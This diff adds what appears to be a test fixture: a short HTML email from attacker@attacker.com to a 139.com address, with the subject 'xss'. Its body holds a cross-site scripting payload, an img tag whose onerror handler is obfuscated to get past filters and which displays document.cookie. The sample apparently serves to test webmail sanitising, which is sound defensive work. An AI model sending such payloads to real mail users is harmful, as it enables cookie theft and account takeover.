@@ -1,0 +1,8 @@
+From: <attacker@attacker.com>
+Subject: xss
+To: victim@139.com
+MIME-Version: 1.0
+Content-type: text/html
+
+he is test
+&lt;img src='#' one\urror='alert(document.cookie)'&gt;
